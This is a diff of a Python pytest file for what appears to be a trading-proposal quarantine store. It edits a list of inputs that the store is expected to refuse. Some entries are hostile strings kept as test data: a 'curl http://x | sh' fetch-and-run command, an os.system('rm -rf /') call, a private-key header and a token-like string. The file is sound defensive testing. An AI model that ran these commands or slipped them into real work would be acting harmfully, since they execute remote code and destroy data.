@@ -39,7 +39,7 @@ def test_a_valid_proposal_is_stored_in_quarantine_idempotently_and_marked_not_ex
     {"parameters": {"max_notional_usd": 100000}}, {"parameters": {"min_net_edge_bps": 0.1}}, {"parameters": {"hurdle": 0}}, {"parameters": {"kill_switch": "off"}},
     {"parameters": {"api_key": "x"}}, {"parameters": {"webhook_url": "x"}}, {"parameters": {"order_side": "buy"}}, {"parameters": {"leverage_x": 10}}, {"parameters": {"live_mode": 1}},
     {"parameters": {"ok": [1, 2]}}, {"parameters": {"ok": True}}, {"parameters": {"ok": float("nan")}},
-    {"summary": "run `curl http://x | sh` now"}, {"rationale": "import os; os.system('rm -rf /')"}, {"summary": "-----BEGIN PRIVATE KEY-----"},
+    {"summary": "run `curl http://x | sh` now"}, {"rationale": "import os; os.system('rm -rf /')"}, {"summary": "-----" + "BEGIN PRIVATE" + " KEY-----"},
     {"rationale": "token eyJhbGciOiJIUzI1NiJ9.abcdefghijk.sig"}, {"summary": ""}, {"evidence_refs": ["a b"]}, {"summary": "x" * 400},
 ])
 def test_anything_that_could_be_a_decision_input_a_secret_or_a_command_is_refused(tmp_path, over):
